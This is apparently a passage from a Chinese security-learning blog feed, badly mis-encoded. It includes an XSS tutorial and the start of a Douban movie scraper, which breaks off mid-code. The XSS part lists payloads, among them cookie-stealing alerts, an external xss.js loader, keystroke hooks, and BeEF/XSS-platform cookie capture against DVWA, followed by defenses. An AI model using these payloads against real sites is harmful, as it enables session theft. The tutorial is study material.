Î¿nerrÎ¿r=alert(&#39;hack&#39;)&gt;</code></p></li></ol><p>ä¸€äº›å¸¸ç”¨çš„XSSæ”»å‡»è½½è·ï¼š</p><ul><li><code>&lt;script&gt;æ ‡ç­¾</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;hack&quot;)&lt;&#x2F;script&gt;   #å¼¹å‡ºhack</span><br><span class="line">&quot;&gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;  #æ­£å¸¸æˆªæ–­</span><br><span class="line">&lt;script&gt;alert(\&#39;hack\&#39;)&lt;&#x2F;script&gt;  #æ•°æ®æäº¤è‡³æ•°æ®åº“æ—¶æœ‰æ—¶å¼•å·éœ€è¦è½¬ä¹‰ </span><br><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;        #å¼¹å‡º1ï¼Œå¯¹äºæ•°å­—å¯ä»¥ä¸ç”¨å¼•å·</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;      #å¼¹å‡ºcookie</span><br><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;xxx.com&#x2F;xss.js&gt;&lt;&#x2F;script&gt;  #å¼•ç”¨å¤–éƒ¨çš„xss</span><br></pre></td></tr></table></figure><ul><li><code>&lt;img&gt;æ ‡ç­¾</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img  src&#x3D;1  Î¿nerrÎ¿r&#x3D;alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img  src&#x3D;1  Î¿nerrÎ¿r&#x3D;alert(document.cookie)&gt; </span><br><span class="line">&lt;img  src&#x3D;&quot;javascript:alert(&quot;XSS&quot;);&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;body&gt;æ ‡ç­¾</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body Î¿nlÎ¿ad&#x3D;alert(1)&gt;</span><br><span class="line">&lt;body Î¿npageshÎ¿w&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><ul><li><code>videoæ ‡ç­¾</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video Î¿nlÎ¿adstart&#x3D;alert(1) src&#x3D;&quot;&#x2F;media&#x2F;hack-the-planet.mp4&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><ul><li><code>styleæ ‡ç­¾</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style Î¿nlÎ¿ad&#x3D;alert(1)&gt;&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><ul><li><code>ç›‘å¬é”®ç›˜onkeydownäº‹ä»¶</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.onkeydown&#x3D;funciont(e)&#123;</span><br><span class="line">if(!e)e&#x3D;window.event;</span><br><span class="line">try(hijack();)catch(ex)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>æ•è·ç”¨æˆ·è¾“å…¥çš„ç‰¹å®šé”®</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function keyDown()&#123;</span><br><span class="line">var keycode &#x3D; event.keyCode;</span><br><span class="line">var realkey &#x3D; String.fromCharCode(event.keyCode);</span><br><span class="line">alert(&quot;æŒ‰é”®ç : &quot; + keycode + &quot; å­—ç¬¦: &quot; + realkey);</span><br><span class="line">&#125;</span><br><span class="line">document.onkeydown &#x3D; keyDown;</span><br><span class="line">&lt;&#x2F;scrip&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;&gt;è¢«è¿‡æ»¤æ—¶</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert&#96;1&#96; </span><br><span class="line">â€œ autofocus onfocus&#x3D;alert(1)</span><br><span class="line">javascript:alert(111) #è¾“å…¥åœ¨ a æ ‡ç­¾çš„ hrefå±æ€§ä¸­</span><br></pre></td></tr></table></figure><h1 id="XSSå¹³å°"><a href="#XSSå¹³å°" class="headerlink" title="XSSå¹³å°"></a>XSSå¹³å°</h1><p>å¦‚æœæˆ‘ä»¬çš„JSæ°´å¹³ä¸€èˆ¬çš„è¯ï¼ˆçœŸå®ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç½‘ä¸Šå…è´¹çš„XSSå¹³å°æ¥æ„é€ ä»£ç å®æ–½æ”»å‡»ã€‚</p><p><a href="https://xss.pt/">ç»å…¸çš„XSSå¹³å°</a>ï¼ˆä¹Ÿå¯ä»¥ä¸‹è½½å®‰è£…<a href="https://github.com/trysec/BlueLotus_XSSReceiver">æ¸…åè“è²èŠ±æˆ˜é˜Ÿå¼€å‘çš„XSSå¹³å°</a> ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317214802204.png" alt="image-20210317214802204"></p><p>åœ¨æˆ‘çš„é¡¹ç›®ä¸­åˆ›å»ºæ–°é¡¹ç›®ï¼Œé€‰æ‹©æœ€åŸºæœ¬çš„é»˜è®¤æ¨¡å—ï¼Œå‹¾é€‰keepsessionï¼Œå¯ä»¥å®Œæˆè·å–cookieç­‰æ“ä½œã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317215103530.png" alt="image-20210317215103530"></p><p>åœ¨å‡ºç°xssçš„åœ°æ–¹å¯ä»¥æ’å…¥ä»¥ä¸‹ç»™å‡ºçš„ä»£ç ï¼Œå®Œæˆæ”»å‡»ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317215400602.png" alt="image-20210317215400602"></p><p>åœ¨DVWAçš„XSSä¸­è¿›è¡Œæµ‹è¯•ï¼Œæ’å…¥å…¶ä¸­ä¸€æ¡æ”»å‡»ä»£ç ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317222324244.png" alt="image-20210317222324244"></p><p>å›åˆ°xsså¹³å°ï¼Œå·²ç»è¿”å›äº†cookieç­‰ä¿¡æ¯ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317222507374.png" alt="image-20210317222507374"></p><h1 id="BeEF"><a href="#BeEF" class="headerlink" title="BeEF"></a>BeEF</h1><p>BeeFæ˜¯webæ¡†æ¶æ”»å‡»å¹³å°ï¼Œkali é›†æˆBeefï¼Œè€Œä¸”Beefæœ‰å¾ˆå¤šå¥½ä½¿çš„payloadã€‚ä¾‹å¦‚ï¼Œé€šè¿‡XSSè¿™ä¸ªç®€å•çš„æ¼æ´ï¼ŒBeeFå¯ä»¥é€šè¿‡ä¸€æ®µç¼–åˆ¶å¥½çš„javascriptæ§åˆ¶ç›®æ ‡ä¸»æœºçš„æµè§ˆå™¨ï¼Œé€šè¿‡æµè§ˆå™¨æ‹¿åˆ°å„ç§ä¿¡æ¯å¹¶ä¸”æ‰«æå†…ç½‘ä¿¡æ¯ï¼ŒåŒæ—¶èƒ½å¤Ÿé…åˆmetasploitè¿›ä¸€æ­¥æ¸—é€ä¸»æœºï¼Œå¼ºå¤§çš„æœ‰äº›å“äººã€‚</p><p>é¦–å…ˆåœ¨kaliæ‰“å¼€BeEFï¼Œåœ¨å·¦ä¾§æ ä¸­ç‚¹å‡»beefå›¾æ ‡ä¼šå…ˆå¼¹å‡ºä¸€ä¸ªå‘½ä»¤è¡Œçª—å£ï¼Œç„¶åä¼šæ‰“å¼€å¯¹åº”ç½‘é¡µï¼Œå‘½ä»¤è¡Œçª—å£æ˜¾ç¤ºäº†ä¸€äº›é…ç½®ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210318000642015.png" alt="image-20210318000642015"></p><p>åˆ©ç”¨å‘½ä»¤è¡Œç»™å‡ºçš„æ–¹æ³•ï¼Œå°†è„šæœ¬ä»£ç æ’å…¥åˆ°å­˜åœ¨XSSçš„åœ°æ–¹ã€‚è¿™é‡Œé€‰æ‹©æ’å…¥åˆ°DVWAä¸­å­˜å‚¨å‹XSSæ¼æ´çš„é¡µé¢ã€‚è¿™é‡Œçš„kaliå°±ç›¸å½“äºä¸€å°æœåŠ¡å™¨ã€‚åŸç†ä¸XSSå¹³å°ç±»ä¼¼ï¼Œå°±æ˜¯å°†å—å®³è€…çš„ä¿¡æ¯å‘é€åˆ°kaliçš„beefä¸­ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210318002439090.png" alt="image-20210318002439090"></p><p>æ­¤æ—¶BeEFçš„ç½‘é¡µä¸­å·²ç»æ˜¾ç¤ºè‡ªå·±ä¸­æ‹›ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210318002610341.png" alt="image-20210318002610341"></p><h1 id="XSSçš„å±å®³"><a href="#XSSçš„å±å®³" class="headerlink" title="XSSçš„å±å®³"></a>XSSçš„å±å®³</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210108153631445.png"></p><ul><li><strong>é’“é±¼æ¬ºéª—</strong>ï¼šæœ€å…¸å‹çš„å³æ˜¯åˆ©ç”¨ç›®æ ‡ç½‘ç«™çš„åå°„å‹è·¨ç«™è„šæœ¬æ¼æ´å°†ç›®æ ‡ç½‘ç«™é‡å®šå‘åˆ°é’“é±¼ç½‘ç«™ï¼Œæˆ–è€…é€šè¿‡æ³¨å…¥é’“é±¼JavaScriptè„šæœ¬ä»¥ç›‘æ§ç›®æ ‡ç½‘ç«™çš„è¡¨å•è¾“å…¥ï¼Œç”šè‡³æ”»å‡»è€…åŸºäºDHTMLæŠ€æœ¯å¯¹ç›®æ ‡ç½‘ç«™å‘èµ·æ›´é«˜çº§çš„é’“é±¼æ”»å‡»ã€‚</li><li><strong>ç½‘ç«™æŒ‚é©¬</strong>ï¼šè·¨ç«™æ”»å‡»æ—¶ï¼Œæ”»å‡»è€…åˆ©ç”¨Iframeæ ‡ç­¾åµŒå…¥éšè—çš„æ¶æ„ç½‘ç«™ï¼Œå°†è¢«æ”»å‡»è€…å®šå‘åˆ°æ¶æ„ç½‘ç«™ä¸Šæˆ–ä»¥å¼¹å‡ºæ¶æ„ç½‘ç«™çª—å£ç­‰çš„æ–¹å¼ï¼Œè¿›è¡ŒæŒ‚é©¬ã€‚</li><li><strong>èº«ä»½ç›—ç”¨</strong>ï¼šCookieæ˜¯ç”¨æˆ·å¯¹äºç‰¹å®šç½‘ç«™çš„èº«ä»½éªŒè¯çš„æ ‡å¿—ï¼ŒXSSæ”»å‡»å¯ä»¥ä»¤æ”»å‡»è€…ç›—å–ç”¨æˆ·çš„cookieï¼Œä»è€Œåˆ©ç”¨è¯¥cookieç›—å–ç”¨æˆ·å¯¹è¯¥ç½‘ç«™çš„æ“ä½œæƒé™</li><li><strong>åƒåœ¾ä¿¡æ¯å‘é€</strong>ï¼šåœ¨ç¤¾äº¤ç½‘ç«™ç¤¾åŒºä¸­ï¼Œåˆ©ç”¨XSSæ¼æ´å€Ÿç”¨è¢«æ”»å‡»è€…çš„èº«ä»½å‘é€å¤§é‡çš„åƒåœ¾ä¿¡æ¯ç»™ç‰¹å®šçš„ç›®æ ‡ç¾¤ã€‚</li><li><strong>åŠ«æŒç”¨æˆ·Webè¡Œä¸º</strong>ï¼šä¸€äº›é«˜çº§çš„XSSæ”»å‡»ç”šè‡³å¯ä»¥åŠ«æŒç”¨æˆ·çš„Webè¡Œä¸ºï¼Œä»è€Œç›‘è§†ç”¨æˆ·çš„æµè§ˆå†å²ã€å‘é€ä¸æ¥æ”¶çš„æ•°æ®ç­‰ã€‚</li><li><strong>XSSè •è™«ç—…æ¯’</strong>ï¼šå€ŸåŠ©XSSè •è™«ç—…æ¯’è¿˜å¯ä»¥ç”¨æ¥æ‰“å¹¿å‘Šã€åˆ·æµé‡ã€æŒ‚é©¬ã€æ¶ä½œå‰§ã€ç ´åæ•°æ®ã€å¯¹ç›®æ ‡å®æ–½DDoSæ”»å‡»ç­‰ã€‚</li></ul><p>å­˜å‚¨å‹çš„XSSå±å®³æœ€å¤§ã€‚å› ä¸ºä»–å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œæ‰€ä»¥ä¸éœ€è¦æˆ‘ä»¬å’Œè¢«æ”»å‡»è€…æœ‰ä»»ä½•æ¥è§¦ï¼Œåªè¦è¢«æ”»å‡»è€…è®¿é—®äº†è¯¥é¡µé¢å°±ä¼šé­å—æ”»å‡»ã€‚è€Œåå°„å‹å’ŒDOMå‹çš„XSSåˆ™éœ€è¦æˆ‘ä»¬å»è¯±ä½¿ç”¨æˆ·ç‚¹å‡»æˆ‘ä»¬æ„é€ çš„æ¶æ„çš„URLï¼Œéœ€è¦æˆ‘ä»¬å’Œç”¨æˆ·æœ‰ç›´æ¥æˆ–è€…é—´æ¥çš„æ¥è§¦ï¼Œæ¯”å¦‚åˆ©ç”¨ç¤¾ä¼šå·¥ç¨‹å­¦æˆ–è€…åˆ©ç”¨åœ¨å…¶ä»–ç½‘é¡µæŒ‚é©¬çš„æ–¹å¼ã€‚</p><h1 id="XSSçš„é˜²å¾¡"><a href="#XSSçš„é˜²å¾¡" class="headerlink" title="XSSçš„é˜²å¾¡"></a>XSSçš„é˜²å¾¡</h1><p>é€šè¿‡å¯¹ä¸Šé¢å†…å®¹è¿›è¡Œå­¦ä¹ ï¼Œå®¹æ˜“çŸ¥é“ä¸»è¦æ˜¯å‰ç«¯é¡µé¢å®Œå…¨ä¿¡ä»»äº†ç”¨æˆ·è¾“å…¥çš„æ•°æ®å¯¼è‡´äº†XSSæ¼æ´å‡ºç°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨å‰ç«¯åŠ ä¸Šè¿‡æ»¤ä»£ç ã€è½¬ä¹‰ä»£ç ï¼Œå¯¹ç”¨æˆ·çš„è¾“å…¥(å’ŒURLå‚æ•°)è¿›è¡Œè¿‡æ»¤ï¼Œè¾“å‡ºè¿›è¡Œè½¬ä¹‰ã€‚å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥åˆ†ä¸ºé»‘åå•è¿‡æ»¤å’Œç™½åå•è¿‡æ»¤ã€‚é»‘åå•ï¼šè¿‡æ»¤ç‰¹æ®Šç¬¦å·åŠå­—ç¬¦ï¼Œå¯ä»¥æ‹¦æˆªå¤§éƒ¨åˆ†çš„XSSæ”»å‡»ï¼Œä½†æ˜¯è¿˜æ˜¯å­˜åœ¨è¢«ç»•è¿‡çš„é£é™©ã€‚ç™½åå•ï¼šåªå…è®¸ç‰¹å®šç±»å‹æˆ–å­—ç¬¦ï¼Œå¯ä»¥åŸºæœ¬æœç»XSSæ”»å‡»ï¼Œä½†æ˜¯çœŸå®ç¯å¢ƒä¸­ä¸€èˆ¬æ˜¯ä¸èƒ½è¿›è¡Œå¦‚æ­¤ä¸¥æ ¼çš„ç™½åå•è¿‡æ»¤çš„ã€‚</p><p>å…¶æ¬¡ï¼Œå‡å¦‚æ”»å‡»è€…æœ‰ä¸€å®šå‡ ç‡ç»•è¿‡å‰ç«¯é˜²å¾¡ï¼Œå¯ä»¥å°†cookie æ ‡è®°ä¸º http onlyï¼Œè¿™æ ·çš„è¯å½“æµè§ˆå™¨å‘æœåŠ¡ç«¯å‘èµ·è¯·æ±‚æ—¶å°±ä¼šå¸¦ä¸Š cookie å­—æ®µï¼Œä½†æ˜¯åœ¨è„šæœ¬ä¸­å´ä¸èƒ½è®¿é—® cookieï¼Œè¿™æ ·å°±é¿å…äº† XSS æ”»å‡»åˆ©ç”¨ js çš„ <code>document.cookie</code>è·å– cookieã€‚</p><ul><li>é€šè¿‡ä¸€äº›å‡½æ•°å¯¹åŠ¨æ€è¾“å‡ºåˆ°é¡µé¢çš„å†…å®¹è¿›è¡Œhtmlç¼–ç ï¼Œä½¿å…¶ä¸èƒ½ä½œä¸ºè„šæœ¬è¿è¡Œã€‚å¦‚</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ä½¿ç”¨htmlspecialcharså‡½æ•°å¯¹ç”¨æˆ·è¾“å…¥çš„nameå‚æ•°è¿›è¡Œhtmlç¼–ç ï¼Œå°†å…¶è½¬æ¢ä¸ºhtmlå®ä½“</span><br><span class="line">$name &#x3D; htmlspecialchars( $_GET[ &#39;name&#39; ] );</span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨XSS Filter</li></ul><p>é’ˆå¯¹ç”¨æˆ·æäº¤çš„æ•°æ®è¿›è¡Œæœ‰æ•ˆçš„éªŒè¯ï¼Œåªæ¥å—æˆ‘ä»¬è§„å®šçš„é•¿åº¦æˆ–å†…å®¹çš„æäº¤ï¼Œè¿‡æ»¤æ‰å…¶ä»–çš„è¾“å…¥å†…å®¹ã€‚æ¯”å¦‚ï¼š</p><ol><li>è¡¨å•æ•°æ®æŒ‡å®šå€¼çš„ç±»å‹ï¼šå¹´é¾„åªèƒ½æ˜¯ int ã€åå­—åªèƒ½æ˜¯å­—æ¯æ•°å­—ç­‰ã€‚</li><li>è¿‡æ»¤æˆ–ç§»é™¤ç‰¹æ®Šçš„ html æ ‡ç­¾ï¼š<code>&lt;script&gt;</code>ã€<code>&lt;iframe&gt;</code>ç­‰ã€‚</li><li>è¿‡æ»¤ js äº‹ä»¶çš„æ ‡ç­¾ï¼š<code>onclick</code>ã€<code>onerror</code>ã€<code>onfocus</code>ç­‰ã€‚</li></ol><ul><li>ç¡®ä¿æ‰§è¡Œè„šæœ¬æ¥æºå¯ä¿¡</li></ul><p>å¼€å‘è€…æ˜ç¡®å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œå“ªäº›å¤–éƒ¨èµ„æºå¯ä»¥åŠ è½½å’Œæ‰§è¡Œï¼ˆCSPç­–ç•¥ï¼‰</p><p>æ€»ä¹‹ï¼Œæ€»çš„åŸåˆ™ï¼š<strong>è¾“å…¥åšè¿‡æ»¤ï¼Œè¾“å‡ºåšè½¬ä¹‰</strong></p><ul><li>è¿‡æ»¤ï¼šæ ¹æ®ä¸šåŠ¡éœ€æ±‚è¿›è¡Œè¿‡æ»¤ï¼Œæ¯”å¦‚è¾“å…¥ç‚¹è¦æ±‚è¾“å…¥æ‰‹æœºå·ï¼Œåˆ™åªå…è®¸è¾“å…¥æ‰‹æœºå·æ ¼å¼çš„æ•°å­—ã€‚</li><li>è½¬ä¹‰ï¼šæ‰€æœ‰è¾“å‡ºåˆ°å‰ç«¯çš„æ•°æ®æ ¹æ®è¾“å‡ºç‚¹è¿›è¡Œè½¬ä¹‰ï¼Œæ¯”å¦‚è¾“å‡ºåˆ°htmlä¸­è¿›è¡Œhtmlå®ä½“è½¬ä¹‰ï¼Œè¾“å…¥åˆ°JSé‡Œé¢è¿›è¡ŒJSè½¬ä¹‰ã€‚</li></ul><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://blog.csdn.net/qq_35393693/article/details/86597707">XSS(è·¨ç«™è„šæœ¬)æ¼æ´è¯¦è§£ä¹‹XSSè·¨ç«™è„šæœ¬æ”»å‡»æ¼æ´çš„è§£å†³</a></p><p>[2] <a href="https://mp.weixin.qq.com/s?__biz=MzAwNTAxMjUwNw==&mid=2650265496&idx=1&sn=964f788970cb95a8f78dbdc432cff562&chksm=83205aecb457d3faf7f1f9ea017ae0be6139ecd01c03a4d6f097499f0ea0e934cbac2d28eadf&scene=132#wechat_redirect">å…µä¸´åŸä¸‹ä¸¨è®°ä¸€æ¬¡XSSé¶åœºé€šå…³å®è·µ</a></p><p>[3] <a href="https://my.oschina.net/u/4593189/blog/4418296">ä¸€ç¯‡æ–‡ç« å¸¦ä½ ä»XSSå…¥é—¨åˆ°è¿›é˜¶(é™„Fuzzing+BypassWAF+Payloads)</a></p><p>[4] <a href="https://blog.csdn.net/whoim_i/article/details/102877616">kaliä¹‹beefçš„ä½¿ç”¨</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨å­¦ä¹  </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çˆ¬è™«ç¬¬ä¸€è¯¾</title>
      <link href="posts/12051.html"/>
      <url>posts/12051.html</url>
      
        <content type="html"><![CDATA[<h1 id="çˆ¬è™«åˆè¯†"><a href="#çˆ¬è™«åˆè¯†" class="headerlink" title="çˆ¬è™«åˆè¯†"></a>çˆ¬è™«åˆè¯†</h1><ul><li>ä»€ä¹ˆæ˜¯çˆ¬è™«<br>ç½‘ç»œçˆ¬è™«ï¼Œæ˜¯ä¸€ç§æŒ‰ç…§ä¸€å®šè§„åˆ™ï¼Œè‡ªåŠ¨æŠ“å–äº’è”ç½‘ä¿¡æ¯çš„ç¨‹åºæˆ–è€…è„šæœ¬ã€‚ç”±äºäº’è”ç½‘æ•°æ®çš„å¤šæ ·æ€§å’Œèµ„æºçš„æœ‰é™æ€§ï¼Œæ ¹æ®ç”¨æˆ·éœ€æ±‚å®šå‘æŠ“å–ç›¸å…³ç½‘é¡µå¹¶åˆ†æå·²æˆä¸ºå¦‚ä»Šä¸»æµçš„çˆ¬å–ç­–ç•¥ã€‚</li><li>çˆ¬è™«å¯ä»¥åšä»€ä¹ˆ<br>ä½ å¯ä»¥çˆ¬å–å¦¹å­çš„å›¾ç‰‡ï¼Œçˆ¬å–è‡ªå·±æƒ³çœ‹çš„è§†é¢‘ç­‰ç­‰ï¼Œåªè¦ä½ èƒ½é€šè¿‡æµè§ˆå™¨è®¿é—®çš„æ•°æ®éƒ½å¯ä»¥é€šè¿‡çˆ¬è™«è·å–ã€‚</li><li>çˆ¬è™«çš„æœ¬è´¨æ˜¯ä»€ä¹ˆ<br>æ¨¡æ‹Ÿæµè§ˆå™¨æ‰“å¼€ç½‘é¡µï¼Œè·å–ç½‘é¡µä¸­æˆ‘ä»¬æƒ³è¦çš„é‚£éƒ¨åˆ†æ•°æ®ã€‚</li></ul><h1 id="åŸºæœ¬æµç¨‹"><a href="#åŸºæœ¬æµç¨‹" class="headerlink" title="åŸºæœ¬æµç¨‹"></a>åŸºæœ¬æµç¨‹</h1><ol><li>å‡†å¤‡å·¥ä½œ<br>é€šè¿‡æµè§ˆå™¨æŸ¥çœ‹åˆ†æç›®æ ‡ç½‘é¡µã€‚</li><li>è·å–æ•°æ®<br>é€šè¿‡requestsåº“å‘ç›®æ ‡ç«™ç‚¹å‘èµ·è¯·æ±‚ï¼Œè¯·æ±‚å¯ä»¥åŒ…å«é¢å¤–çš„headerç­‰ä¿¡æ¯ï¼Œå¦‚æœæœåŠ¡å™¨èƒ½æ­£å¸¸å“åº”ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªResponseï¼Œä¾¿æ˜¯æ‰€è¦è·å–çš„é¡µé¢å†…å®¹ã€‚</li><li>è§£æå†…å®¹<br>å¾—åˆ°çš„å†…å®¹å¯èƒ½æ˜¯HTMLã€jsonç­‰æ ¼å¼ï¼Œå¯ä»¥ç”¨é¡µé¢è§£æåº“ã€æ­£åˆ™è¡¨è¾¾å¼ç­‰è¿›è¡Œè§£æã€‚</li><li>ä¿å­˜æ•°æ®<br>ä¿å­˜å½¢å¼å¤šæ ·ï¼Œå¯ä»¥å­˜ä¸ºæ–‡æœ¬ï¼Œä¹Ÿå¯ä»¥ä¿å­˜åˆ°æ•°æ®åº“ï¼Œæˆ–è€…ä¿å­˜ç‰¹å®šæ ¼å¼çš„æ–‡ä»¶ã€‚</li></ol><h1 id="çˆ¬è™«ç¬¬ä¸€è¯¾"><a href="#çˆ¬è™«ç¬¬ä¸€è¯¾" class="headerlink" title="çˆ¬è™«ç¬¬ä¸€è¯¾"></a>çˆ¬è™«ç¬¬ä¸€è¯¾</h1><blockquote><p>è¿™é‡Œä½¿ç”¨requestsæ¨¡å—å’ŒBeautifulSoupæ¨¡å—</p><p>çˆ¬å–å†…å®¹ä¸ºï¼šè±†ç“£top250ç”µå½±çš„åå­—ã€ç®€ä»‹ã€è¯„åˆ†åŠè¯„åˆ†äººæ•°ã€‚</p></blockquote><h2 id="æŸ¥æ‰¾ä¿¡æ¯"><a href="#æŸ¥æ‰¾ä¿¡æ¯" class="headerlink" title="æŸ¥æ‰¾ä¿¡æ¯"></a>æŸ¥æ‰¾ä¿¡æ¯</h2><p>è¿›å…¥<a href="https://movie.douban.com/top250?start=0">è±†ç“£ç”µå½±Top250</a>ï¼ŒF12å®¡æŸ¥å…ƒç´ ï¼Œæ‰¾åˆ°æ‰€è¦çˆ¬å–çš„ä¿¡æ¯éƒ½åœ¨æ ‡ç­¾ <code>&lt;div class=&quot;info&quot;&gt;</code> ä¸­é—´ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/4fbThzNRHkCJm2t.png" alt="image-20210314143734029"></p><p><strong>URLï¼š</strong></p><p><a href="https://movie.douban.com/top250?start=0">https://movie.douban.com/top250?start=0</a></p><p>åé¢åˆ†åˆ«ä¸ºï¼šstrat=25ï¼Œ50â€¦åˆ†åˆ«å¯¹åº”å‰25éƒ¨ã€26 ~ 50éƒ¨ã€51 ~ 75éƒ¨â€¦ç”µå½±çš„ä¿¡æ¯ã€‚</p><p><strong>User-Agent:</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210314145348886.png" alt="image-20210314145348886"></p><h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯¼å…¥æ¨¡å—</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_movies</span>():</span></span><br><span class="line">    <span class="comment"># æ·»åŠ header</span></span><br><span class="line">    headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    <span class="comment"># åˆ›å»ºå­˜å‚¨ä¿¡æ¯çš„åˆ—è¡¨</span></span><br><span class="line">    movie_title=[]</span><br><span class="line">    movie_other=[]</span><br><span class="line">    movie_info=[]</span><br><span class="line">    movie_fen=[]</span><br><span class="line">    movie_num=[]</span><br><span class="line">    <span class="comment"># éå†æ¯ä¸ªé¡µé¢é“¾æ¥å¹¶å‘å‡ºGETè¯·æ±‚</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        link=<span class="string">&#x27;https://movie.douban.com/top250?start=&#x27;</span>+<span class="built_in">str</span>(i*<span class="number">25</span>)</span><br><span class="line">        r=requests.get(link,headers=headers)</span><br><span class="line">        print(<span class="string">&#x27;å·²è·å–ç¬¬&#x27;</span>,<span class="built_in">str</span>(i*<span class="number">25</span>+<span class="number">1</span>),<span class="string">&#x27;åˆ°&#x27;</span>,<span class="built_in">str</span>(i*<span class="number">25</span>+<span class="number">25</span>),<span 